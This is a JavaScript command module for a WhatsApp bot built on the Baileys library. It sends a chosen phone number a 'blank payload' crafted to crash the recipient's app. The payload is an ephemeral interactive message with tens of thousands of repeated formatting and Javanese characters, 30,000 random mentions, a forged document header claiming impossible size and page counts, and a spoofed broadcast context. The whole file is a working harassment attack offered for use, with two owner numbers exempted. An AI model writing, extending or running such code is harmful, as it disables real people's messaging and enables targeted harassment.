// commands/batblank.js
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

const PROTECTED_NUMBERS = ['2347072182960', '2349049636843'];

async function batblankCommand(sock, chatId, message, args) {
    if (!message.key.fromMe) {
        await sock.sendMessage(chatId, { text: "❌ *Owner Only Command*" }, { quoted: message });
        return;
    }

    const targetNumber = args[0];
    if (!targetNumber) {
        await sock.sendMessage(chatId, { 
            text: "🦇 *Bat Blank*\n\nUsage: .batblank <number>\nExample: .batblank 628123456789"
        }, { quoted: message });
        return;
    }

    const cleanNumber = targetNumber.replace(/[^0-9]/g, '');
    
    if (PROTECTED_NUMBERS.includes(cleanNumber)) {
        await sock.sendMessage(chatId, { text: "🛡️ *Protected Number*\nThis number cannot be targeted." }, { quoted: message });
        return;
    }

    const target = cleanNumber + '@s.whatsapp.net';
    
    await sock.sendMessage(chatId, { text: `🦇 Sending blank payload to ${cleanNumber}...` }, { quoted: message });

    try {
        const vampireText = `_*~@2~*_\n`.repeat(10500);
        const privateText = 'ꦽ'.repeat(5000);

        const messageContent = {
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
                                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                                fileName: "Pembasmi Kontol",
                                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1726867151",
                                contactVcard: true,
                                jpegThumbnail: null,
                            },
                            hasMediaAttachment: true,
                        },
                        body: { text: 'Trash Invictus Blank!' + vampireText + privateText },
                        footer: { text: '' },
                        contextInfo: {
                            mentionedJid: ["15056662003@s.whatsapp.net", ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
                            forwardingScore: 1,
                            isForwarded: true,
                            fromMe: false,
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, messageContent, { participant: { jid: target } });
        await sock.sendMessage(chatId, { text: `✅ Blank payload delivered to ${cleanNumber}` }, { quoted: message });

    } catch (error) {
        console.error('[BatBlank]', error);
        await sock.sendMessage(chatId, { text: `❌ Failed: ${error.message}` }, { quoted: message });
    }
}

module.exports = batblankCommand;